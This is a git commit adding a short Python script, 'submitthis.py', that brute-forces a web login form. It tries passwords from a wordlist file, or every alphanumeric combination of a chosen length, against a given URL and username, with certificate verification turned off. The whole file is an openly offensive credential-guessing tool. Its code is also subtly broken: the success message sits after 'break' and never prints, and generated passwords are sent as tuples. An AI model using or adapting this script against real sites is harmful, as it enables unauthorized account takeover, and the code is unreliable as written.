a553239424b476c0ae404c4a93348f7f4f088680
3NiGMa404 <53730248+3NiGMa404@users.noreply.github.com>
2020-04-27 19:13:50 +1000

    Add files via upload

---
+++ submitthis.py
@@ -0,0 +1,30 @@
+import requests as r
+import warnings
+import string
+import itertools
+warnings.filterwarnings("ignore")
+
+l = input('URL: ')
+if input('Do you have a password list (y/n)? ').startswith('y'):
+    with open('p.txt') as o:
+        p = set(o.read().split('\n'))
+        u = input('username: ')
+    for i in p:
+        if 'incorr' not in str(
+                r.post(l, {'username': u, 'password': i}, verify=False).content):
+            break
+            print('password found: {}'.format(i))
+else:
+    le = int(input('pwd length: '))
+
+    def f(l):
+        yield from itertools.product(*([l] * le))
+    ls = list(string.ascii_lowercase) + \
+        list(string.ascii_uppercase) + list(map(str, range(0, 10)))
+    b = 0
+    u = input('username: ')
+    for x in f(ls):
+        if 'incorr' not in str(
+                r.post(l, {'username': u, 'password': x}, verify=False).content):
+            break
+            print('password found: {}'.format(x))
